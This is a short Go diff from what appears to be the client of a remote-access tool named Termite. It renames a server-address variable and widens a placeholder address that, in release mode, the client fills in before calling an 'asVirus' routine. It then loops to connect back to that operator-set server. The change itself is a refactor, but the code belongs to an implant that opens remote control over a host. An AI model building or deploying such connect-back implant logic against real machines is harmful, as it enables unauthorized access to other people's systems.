@@ -790,10 +790,10 @@ func asVirus() {
 
 func main() {
 	release := true
-	service := "127.0.0.1:13337"
+	endpoint := "127.0.0.1:13337"
 
 	if release {
-		service = strings.Trim("xxx.xxx.xxx.xxx:xxxxx", " ")
+		endpoint = strings.Trim("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:xxxxx", " ")
 		asVirus()
 	}
 
@@ -805,7 +805,7 @@ func main() {
 
 	for {
 		log.Info("Termite (v%s) starting...", update.Version)
-		if startClient(service) {
+		if startClient(endpoint) {
 			add := (int64(rand.Uint64()) % backoff.Current)
 			log.Error("Connect to server failed, sleeping for %d seconds", backoff.Current+add)
 			backoff.Sleep(add)
